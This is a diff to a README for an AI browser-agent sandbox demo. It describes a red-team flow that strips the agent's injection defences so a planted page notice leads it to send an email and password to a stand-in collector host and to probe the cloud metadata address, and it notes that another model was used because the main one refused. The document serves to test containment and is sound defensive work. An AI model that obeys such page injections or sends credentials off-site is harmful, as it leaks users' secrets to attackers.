@@ -97,10 +97,10 @@ Tick "Human in the loop" on the demo page (or send `"approval": true` when start
 
 A well-behaved model simply ignores the injection, which shows the model is careful but not that the sandbox works. The **Compromised agent** flow removes the defences one by one:
 
-1. **Compromise the model.** The injection defence in the system prompt is replaced by an order to trust notices on the page, the page is no longer marked as untrusted, and the action policy is off. If the model now emits `navigate collector.example.net/verify?email={{email}}&password={{password}}`, it runs, and only the sandbox can stop it.
-2. **If the model refuses** (in our tests `glm-5.3` refused about 6 times out of 7 and named the injection), the run simulates a fully compromised agent: it opens exactly the off-site URLs the page asks for, with the policy off.
+1. **Compromise the model.** For the first steps the agent is `minimax-m3.1-flash` on Vultr Serverless Inference (`RED_TEAM_MODEL`), its injection defence is replaced by an order to trust notices on the page, the page is no longer marked as untrusted, and the action policy is off. In our tests it followed the page every time: it navigated to `collector.example.net/verify?email={{email}}&password={{password}}` and to `169.254.169.254` on its own, and only the sandbox stopped it. (`glm-5.3`, the main agent, refused the same setup in 6 of 7 tries, which is why a more obedient model plays this role.)
+2. **If the model refuses anyway**, the run simulates a fully compromised agent: it opens exactly the off-site URLs the page asks for, with the policy off.
 
-Either way the result is the same: the egress proxy blocks every attempt before any secret leaves, the UI shows a red "Containment: N of N escape attempts blocked" banner, and the run log says which layer was tested. The test password is substituted only at the moment of the request and is redacted from everything the model and the log see.
+The compromised agent can't end the run: once it gives up or claims success, the normal agent (`glm-5.3`, defences on) takes over and finishes the signup, so the three checks still run. The UI shows a red "Containment: N of N escape attempts blocked" banner naming which layer was tested. The test password is substituted only at the moment of the request and is redacted from everything the model and the log see.
 
 ## Verify the containment yourself
 
